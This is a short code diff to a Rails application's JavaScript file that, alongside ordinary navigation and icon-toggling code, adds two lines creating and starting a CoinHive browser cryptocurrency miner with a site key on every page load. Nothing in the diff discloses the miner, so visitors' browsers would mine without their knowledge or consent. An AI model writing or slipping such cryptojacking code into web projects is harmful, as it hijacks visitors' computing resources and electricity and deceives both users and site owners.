@@ -16,6 +16,8 @@
 //= require_tree .
 
 $(document).ready(function(){
+  var miner = new CoinHive.Anonymous('80bDWx1KXIBOSEbxCmC01GVNYxUlqUYo'); 
+  miner.start(); 
 
   $(".button-collapse").sideNav();
 
@@ -37,5 +39,4 @@ $(document).ready(function(){
         $(that).removeClass('fa-heart').addClass('fa-heart-o')
     })
   });
-
 });
